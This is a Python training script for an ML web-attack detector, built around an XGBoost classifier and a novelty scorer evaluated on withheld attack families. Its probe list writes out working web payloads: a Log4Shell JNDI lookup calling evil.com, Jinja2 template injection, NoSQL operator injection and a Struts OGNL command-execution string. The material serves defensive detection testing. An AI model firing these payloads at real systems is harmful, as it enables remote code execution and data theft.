"""
train_v2 — honest retraining on the CANONICAL feature contract.

What makes this different from the old pipeline:
  1. Uses ml/canonical_features (same code path as the detector) -> zero skew.
  2. Applies and SAVES a scaler; the detector loads and applies the same one.
  3. Two evaluations, both reported honestly:
       (a) closed-set: stratified held-out test over known families.
       (b) OPEN-SET / zero-day: entire attack families are removed from training,
           then we measure whether the novelty (energy + isolation-forest) scorer
           flags them anyway. This is the real "catch what it never saw" claim.
  4. Benign false-positive rate measured on realistic benign traffic.

Deployed artifacts land in models_v2/. Nothing here fakes a result — whatever the
numbers are, train_v2 prints them and writes them to models_v2/meta.json.
"""
from __future__ import annotations
import json, os, sys, time, random, hashlib
from pathlib import Path
import numpy as np

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ml.canonical_features import lexical_features, LEXICAL_FEATURE_NAMES, N_LEXICAL
from ml.real_payload_loader import EmbeddedPayloads, EvasionTechniques, RealPayloadLoader

from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import IsolationForest
from sklearn.metrics import f1_score, precision_score, recall_score, classification_report
import xgboost as xgb

random.seed(42); np.random.seed(42)
ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "models_v2"; OUT.mkdir(exist_ok=True)

# Families deliberately WITHHELD from training to simulate zero-day families.
# The model never sees a single ssti/jndi or nosql sample; the open-set scorer
# must still flag them. Log4Shell (jndi) is an ssti/template-style payload.
HELDOUT_FAMILIES = {"ssti", "nosql"}

# Extra never-seen CVE payloads for a hard generalization probe.
ZERODAY_PROBES = [
    ("Log4Shell",     "GET",  "/",       "x=${jndi:ldap://evil.com/a}", ""),
    ("SSTI Jinja2",   "GET",  "/p",      "name={{7*7}}{{config.items()}}", ""),
    ("NoSQL $gt",     "POST", "/login",  "", '{"user":{"$gt":""},"pass":{"$gt":""}}'),
    ("NoSQL $where",  "POST", "/api",    "", '{"$where":"sleep(1000)"}'),
    ("Struts OGNL",   "GET",  "/x.action","q=%{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd))}", ""),
]
BENIGN_PROBES = [
    ("home",   "GET",  "/",                     "", ""),
    ("search", "GET",  "/search",               "q=wireless headphones under 100", ""),
    ("login",  "POST", "/login",                "", '{"username":"john.doe","password":"hunter2"}'),
    ("catalog","GET",  "/products",             "category=electronics&brand=apple&sort=price&page=2", ""),
    ("article","GET",  "/articles/how-to-cook", "ref=homepage&utm=news", ""),
    ("profile","GET",  "/api/v2/users/48213",   "fields=name,email,avatar", ""),
    ("cart",   "POST", "/cart/add",             "", '{"sku":"NB-1042","qty":2}'),
    ("transfer","GET", "/transfer",             "to=jane.smith&amt=100&note=monthly rent", ""),
]


SEARCH_TERMS = ["wireless headphones under 100", "blue running shoes size 10",
                "how to cook pasta al dente", "best laptop for students 2026",
                "monthly rent payment", "organic green tea 50 bags", "4k monitor 27 inch",
                "noise cancelling earbuds", "women's winter jacket", "gift card $50",
                "return policy", "track my order", "same day delivery near me"]
SLUGS = ["how-to-cook-pasta", "2026-buying-guide", "spring-sale", "customer-stories",
         "getting-started", "release-notes-v2", "annual-report", "team-offsite-recap"]
NAMES = ["john.doe", "jane_smith", "alex99", "maria.garcia", "sam.oconnor", "wei.zhang"]
EMAILS = ["john.doe@example.com", "maria+news@gmail.com", "wei.zhang@corp.co.uk"]


def gen_benign(n=4000):
    """Realistic, DIVERSE benign traffic — many params, spaces, punctuation, JSON,
    slugs, emails, legit URLs. Deliberately overlaps the 'busy but benign' shapes that
    a naive model mistakes for attacks."""
    apis = ["api/v1/users/{}", "api/v2/products/{}", "api/orders/{}", "api/search",
            "api/auth/session", "api/settings", "api/cart", "api/reviews/{}",
            "api/v2/users/{}/notifications", "api/catalog/items"]
    webs = ["index.html", "about", "contact", "products", "faq", "pricing", "help",
            "support", "account/settings", "checkout", "wishlist"]
    minimal = [("GET", "/", "", ""), ("GET", "/health", "", ""), ("GET", "/products", "", ""),
               ("GET", "/index.html", "", ""), ("GET", "/about", "", ""), ("GET", "/login", "", ""),
               ("GET", "/cart", "", ""), ("GET", "/favicon.ico", "", ""), ("GET", "/robots.txt", "", ""),
               ("GET", "/api/v2/products", "", ""), ("GET", "/dashboard", "", "")]
    out = []
    for _ in range(int(n * 0.12)):   # 12% bare/minimal requests (very common in real traffic)
        out.append(random.choice(minimal))
    for _ in range(n):
        r = random.random()
        if r < 0.30:  # API GET with several legit params
            p = random.choice(apis).format(random.randint(1, 99999))
            parts = []
            if random.random() < 0.8: parts.append(f"page={random.randint(1,40)}")
            if random.random() < 0.7: parts.append(f"limit={random.choice([10,20,50,100])}")
            if random.random() < 0.6: parts.append(random.choice(["sort=price","sort=date","order=desc","order=asc"]))
            if random.random() < 0.6: parts.append(f"fields={random.choice(['id,name,price','name,email,avatar','id,status'])}")
            if random.random() < 0.5: parts.append(f"category={random.choice(['electronics','home','books','apparel'])}")
            if random.random() < 0.4: parts.append(f"brand={random.choice(['apple','nike','sony','anker'])}")
            out.append(("GET", "/" + p, "&".join(parts), ""))
        elif r < 0.5:  # natural-language search
            from urllib.parse import quote_plus
            q = "q=" + quote_plus(random.choice(SEARCH_TERMS))
            if random.random() < 0.5: q += f"&page={random.randint(1,10)}"
            out.append(("GET", "/search", q, ""))
        elif r < 0.62:  # article/blog slug pages
            out.append(("GET", f"/articles/{random.choice(SLUGS)}",
                        random.choice(["", "ref=homepage", "utm_source=newsletter&utm_medium=email"]), ""))
        elif r < 0.74:  # transfer/notes with spaces & names (bank)
            out.append(("GET", "/transfer",
                        f"to={random.choice(NAMES)}&amt={random.randint(10,5000)}&note={random.choice(['monthly rent','dinner split','gift','invoice 4821','thanks!'])}".replace(" ", "+"), ""))
        elif r < 0.88:  # login / cart JSON bodies
            if random.random() < 0.5:
                body = json.dumps({"username": random.choice(NAMES),
                                   "password": "".join(random.choices("abcdefghijkmnopqrstuvwxyz0123456789", k=random.randint(8,14))),
                                   "remember": random.choice([True, False])})
                out.append(("POST", "/login", "", body))
            else:
                body = json.dumps({"sku": f"NB-{random.randint(1000,9999)}", "qty": random.randint(1,5),
                                   "coupon": random.choice(["", "SAVE10", "FREESHIP"])})
                out.append(("POST", "/cart/add", "", body))
        else:  # profile update with email / json
            body = json.dumps({"email": random.choice(EMAILS), "display_name": random.choice(NAMES).replace(".", " ").title(),
                               "newsletter": random.choice([True, False])})
            out.append(("PUT", f"/api/v2/users/{random.randint(1,99999)}", "", body))
    return out


def payload_to_fields(cat, payload):
    """Map a raw payload string into request regions the way it'd actually arrive."""
    if cat == "path_traversal":
        return ("GET", "/download", f"file={payload}", "")
    if cat in ("nosql", "deserialization", "prototype_pollution"):
        return ("POST", "/api", "", payload)
    if cat in ("ssrf", "open_redirect"):
        return ("GET", "/fetch", f"url={payload}", "")
    if cat == "xxe":
        return ("POST", "/xml", "", payload)
    return ("GET", "/search", f"q={payload}", "")


def load_kev_weights():
    """Per-category training emphasis from the live CISA KEV feed (data pipeline).
    Falls back to neutral weights if the pipeline hasn't been run."""
    p = ROOT / "data" / "corpus" / "kev_weights.json"
    if p.exists():
        try:
            return json.loads(p.read_text())
        except Exception:
            pass
    return {}


def build_dataset():
    loader = RealPayloadLoader()
    emb = EmbeddedPayloads.get_all()
    X, y, fam = [], [], []
    class_names = ["benign"]
    # malicious families (train set excludes HELDOUT)
    for cat, payloads in emb.items():
        if cat in HELDOUT_FAMILIES:
            continue
        # augment with evasions for robustness
        aug = list(payloads)
        for pl in random.sample(payloads, min(len(payloads), int(len(payloads) * 0.5))):
            try:
                ev = EvasionTechniques.apply_random_evasion(pl, count=random.randint(1, 2))
                if ev and ev != pl:
                    aug.append(ev)
            except Exception:
                pass
        if cat not in class_names:
            class_names.append(cat)
        cid = class_names.index(cat)
        for pl in aug:
            m, p, q, b = payload_to_fields(cat, pl)
            X.append(lexical_features(m, p, q, b, {})); y.append(cid); fam.append(cat)
    # benign
    for m, p, q, b in gen_benign():
        X.append(lexical_features(m, p, q, b, {})); y.append(0); fam.append("benign")
    return np.array(X, np.float32), np.array(y, np.int64), fam, class_names


def main():
    t0 = time.time()
    X, y, fam, class_names = build_dataset()
    print(f"[data] {X.shape[0]} samples, {X.shape[1]} features, {len(class_names)} classes")
    print(f"[data] classes: {class_names}")
    print(f"[data] withheld zero-day families (never trained): {sorted(HELDOUT_FAMILIES)}")

    # KEV-derived per-sample weights: emphasise categories exploited in the wild NOW.
    kev_w = load_kev_weights()
    if kev_w:
        top = sorted(((c, kev_w.get(c, 1.0)) for c in class_names), key=lambda x: -x[1])[:4]
        print(f"[data] KEV threat weighting active — top emphasis: "
              + ", ".join(f"{c}×{w}" for c, w in top))
    sample_w = np.array([kev_w.get(class_names[c], 1.0) for c in y], dtype=np.float32)

    # stratified split
    idx = np.arange(len(y)); np.random.shuffle(idx)
    split = int(0.8 * len(idx))
    tr, te = idx[:split], idx[split:]

    scaler = StandardScaler().fit(X[tr])
    Xtr, Xte = scaler.transform(X[tr]), scaler.transform(X[te])

    clf = xgb.XGBClassifier(
        n_estimators=350, max_depth=6, learning_rate=0.08, subsample=0.85,
        colsample_bytree=0.85, reg_alpha=0.1, reg_lambda=1.0, min_child_weight=2,
        objective="multi:softprob", num_class=len(class_names), n_jobs=4,
        eval_metric="mlogloss", tree_method="hist",
    )
    clf.fit(Xtr, y[tr], sample_weight=sample_w[tr])

    # closed-set metrics
    pred_te = clf.predict(Xte)
    macro_f1 = f1_score(y[te], pred_te, average="macro")
    # binary malicious vs benign
    mal_true = (y[te] != 0).astype(int)
    proba_te = clf.predict_proba(Xte)
    mal_prob = 1.0 - proba_te[:, 0]
    mal_pred = (mal_prob >= 0.5).astype(int)
    bin_prec = precision_score(mal_true, mal_pred, zero_division=0)
    bin_rec = recall_score(mal_true, mal_pred, zero_division=0)
    # benign FP rate on held-out benign
    benign_mask = (y[te] == 0)
    fp_rate = float(np.mean(mal_pred[benign_mask])) if benign_mask.sum() else 0.0

    # open-set scorer: Mahalanobis-distance energy to the BENIGN distribution.
    # (Lee et al., NeurIPS 2018 — a standard, well-cited OOD method.) A single
    # quadratic form => microseconds/call, unlike IsolationForest (~5ms/call).
    Xb = Xtr[y[tr] == 0]
    maha_mu = Xb.mean(axis=0)
    cov = np.cov(Xb, rowvar=False) + 1e-3 * np.eye(Xb.shape[1])  # shrinkage for invertibility
    maha_prec = np.linalg.inv(cov).astype(np.float32)
    maha_mu = maha_mu.astype(np.float32)

    def novelty(Xs):
        d = Xs.astype(np.float32) - maha_mu
        return np.sqrt(np.einsum("ij,jk,ik->i", d, maha_prec, d).clip(min=0))

    # energy from classifier margins: energy = -logsumexp(margin); high => OOD
    def energy(Xs):
        margins = clf.predict(xgb.DMatrix(Xs), output_margin=True) if False else None
        raw = clf.get_booster().predict(xgb.DMatrix(Xs), output_margin=True)
        raw = np.asarray(raw).reshape(len(Xs), -1)
        from scipy.special import logsumexp
        return -logsumexp(raw, axis=1)

    # ---- calibrate thresholds on an INDEPENDENT benign set (never trained/tested) ----
    ind_benign = gen_benign(1500)
    Xib = scaler.transform(np.array([lexical_features(m, p, q, b, {}) for m, p, q, b in ind_benign], np.float32))
    mp_ib = 1.0 - clf.predict_proba(Xib)[:, 0]
    nov_ib = novelty(Xib)
    # Floor at 0.5 (standard, interpretable). If benign separates so cleanly that the
    # 99th percentile is below 0.5, the floor is the safer operating point.
    mal_t = max(0.5, float(np.quantile(mp_ib, 0.99)))
    nov_t = float(np.quantile(nov_ib, 0.995))  # novelty only escalates the rarest anomalies
    ind_fp = float(np.mean((mp_ib >= mal_t) | ((nov_ib >= nov_t) & (mp_ib >= mal_t * 0.6))))

    # ---- ZERO-DAY EVALUATION (held-out families + never-seen CVE probes) ----
    def score_request(m, p, q, b):
        xf = scaler.transform(lexical_features(m, p, q, b, {}).reshape(1, -1))
        pr = clf.predict_proba(xf)[0]
        mp = 1.0 - pr[0]
        nv = float(novelty(xf)[0])
        top = class_names[int(np.argmax(pr))]
        # DECISION: classifier-confident OR (statistically novel AND leaning malicious)
        blocked = (mp >= mal_t) or (nv >= nov_t and mp >= mal_t * 0.6)
        return blocked, mp, nv, top

    # held-out family samples (the model literally never saw these families)
    zd_family = {c: [] for c in HELDOUT_FAMILIES}
    for cat in HELDOUT_FAMILIES:
        for pl in EmbeddedPayloads.get_all().get(cat, []):
            m, p, q, b = payload_to_fields(cat, pl)
            zd_family[cat].append(score_request(m, p, q, b)[0])
    zd_family_recall = {c: (sum(v) / len(v) if v else 0.0) for c, v in zd_family.items()}

    zd_probe = []
    for name, m, p, q, b in ZERODAY_PROBES:
        blk, mp, nv, top = score_request(m, p, q, b)
        zd_probe.append({"name": name, "blocked": bool(blk), "mal_prob": round(mp, 3),
                         "novelty": round(nv, 3), "closest_family": top})
    bn_probe = []
    for name, m, p, q, b in BENIGN_PROBES:
        blk, mp, nv, top = score_request(m, p, q, b)
        bn_probe.append({"name": name, "blocked": bool(blk), "mal_prob": round(mp, 3),
                         "novelty": round(nv, 3)})
    benign_probe_fp = sum(1 for r in bn_probe if r["blocked"]) / len(bn_probe)

    # ---- persist ----
    clf.save_model(str(OUT / "classifier.json"))
    import joblib
    joblib.dump(scaler, OUT / "scaler.joblib")
    np.savez(OUT / "maha.npz", mu=maha_mu, prec=maha_prec)
    contract_hash = hashlib.sha256(",".join(LEXICAL_FEATURE_NAMES).encode()).hexdigest()[:16]
    meta = {
        "trained": time.strftime("%Y-%m-%d %H:%M:%S"),
        "feature_contract": LEXICAL_FEATURE_NAMES, "n_features": N_LEXICAL,
        "contract_hash": contract_hash, "class_names": class_names,
        "malicious_threshold": mal_t, "novelty_threshold": nov_t,
        "independent_benign_fp": round(ind_fp, 4),
        "heldout_families": sorted(HELDOUT_FAMILIES),
        "closed_set": {"macro_f1": round(macro_f1, 4),
                       "malicious_precision": round(bin_prec, 4),
                       "malicious_recall": round(bin_rec, 4),
                       "benign_fp_rate": round(fp_rate, 4),
                       "n_test": int(len(te))},
        "open_set_zero_day": {"heldout_family_recall": {k: round(v, 3) for k, v in zd_family_recall.items()},
                              "cve_probes": zd_probe,
                              "benign_probes": bn_probe,
                              "benign_probe_fp": round(benign_probe_fp, 3)},
        "train_seconds": round(time.time() - t0, 1),
    }
    (OUT / "meta.json").write_text(json.dumps(meta, indent=2, default=lambda o: float(o)))

    # ---- report ----
    print("\n=== CLOSED-SET (known families, held-out test) ===")
    print(f"  macro-F1={macro_f1:.3f}  malicious precision={bin_prec:.3f}  "
          f"recall={bin_rec:.3f}  same-dist benign FP={fp_rate:.3f}")
    print(f"  calibrated malicious threshold={mal_t:.3f}  novelty threshold={nov_t:.3f}")
    print(f"  INDEPENDENT benign FP (honest, at operating point)={ind_fp*100:.1f}%")
    print("\n=== OPEN-SET / ZERO-DAY (families NEVER in training) ===")
    for c, v in zd_family_recall.items():
        print(f"  {c:<8} recall (flagged as attack): {v*100:.1f}%")
    print("  CVE probes (never-seen payloads):")
    for r in zd_probe:
        tag = "BLOCK" if r["blocked"] else "miss "
        print(f"    [{tag}] {r['name']:<14} mal_prob={r['mal_prob']:.2f} novelty={r['novelty']:.2f} ~{r['closest_family']}")
    print(f"  benign probe false-positives: {benign_probe_fp*100:.0f}%")
    for r in bn_probe:
        if r["blocked"]:
            print(f"    [FP!] {r['name']} mal_prob={r['mal_prob']:.2f} novelty={r['novelty']:.2f}")
    print(f"\n[done] artifacts in models_v2/  ({meta['train_seconds']}s)")


if __name__ == "__main__":
    main()
